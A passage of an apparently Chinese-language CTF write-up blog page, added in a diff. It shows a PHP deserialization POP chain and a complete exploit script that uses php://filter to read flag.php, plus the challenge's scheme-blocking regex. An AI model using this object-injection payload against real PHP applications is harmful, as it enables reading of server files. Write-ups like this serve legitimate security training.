+</span></span><span style="display:flex;"><span>    $a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Show</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>POP</p>
+<pre tabindex="0"><code>__wakeup()--&gt;__toString()--&gt;__get()--&gt;__invoke()--&gt;append()
+</code></pre><p>注意是<code>include()</code>包含的文件需要转换成base64才能回显flag，exp如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Modifier</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $var <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;php://filter/read=convert.base64-encode/resource=flag.php&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">append</span>($value)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">include</span>($value);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __invoke()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">append</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">var</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Show</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $source;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $str;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;hacker&#34;</span>;
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;index.php&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $p;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Modifier</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __get($key)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $function <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">p</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $function();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Show</span>();
+</span></span><span style="display:flex;"><span>$a<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Test</span>();
+</span></span><span style="display:flex;"><span>$b <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Test</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$show <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Show</span>();
+</span></span><span style="display:flex;"><span>$show<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> $a;
+</span></span><span style="display:flex;"><span>$show<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span> <span style="color:#f92672">=</span> $b;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($show));
+</span></span></code></pre></div><h2 id="安洵杯-2019easy_serialize_php">[安洵杯 2019]easy_serialize_php</h2>
+
+    </article>
+
+    
+
+
+
+  </div>
+</div>
+
+  </main>
+  <footer class="flex flex-none justify-center">
+    <section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300">
+  <div class="flex flex-row">
+    
+  
+  
+  
+  
+    <a href="https://twitter.com/FanBig03" target="_blank" title="Twitter" class="flex flex-row mr-2">
+      <span class="hidden">Twitter</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4l11.733 16h4.267l-11.733 -16z"></path>
+   <path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+  
+  
+  
+  
+    <a href="https://github.com/FanBigFan/" target="_blank" title="Github" class="flex flex-row mr-2">
+      <span class="hidden">Github</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+
+
+  </div>
+  <div class="grow"></div>
+  <div class="flex flex-row">
+    <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0"></path>
+   <path d="M14 9.75a3.016 3.016 0 0 0 -4.163 .173a2.993 2.993 0 0 0 0 4.154a3.016 3.016 0 0 0 4.163 .173"></path>
+</svg>
+</i> 2023 - 2024 FanBig
+    
+  </div>
+  
+</section>
+
+  </footer>
+  <script src="/main.js"></script>
+
+<div class="hidden top-1 right-1" id="code-copy">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" />
+  <path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" />
+</svg>
+
+  </i>
+</div>
+<div class="hidden top-1 right-1" id="code-copy-done">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M5 12l5 5l10 -10" />
+</svg>
+
+  </i>
+</div><script src="/code-copy.js"></script>
+
+
+
+
+
+</body>
+</html>
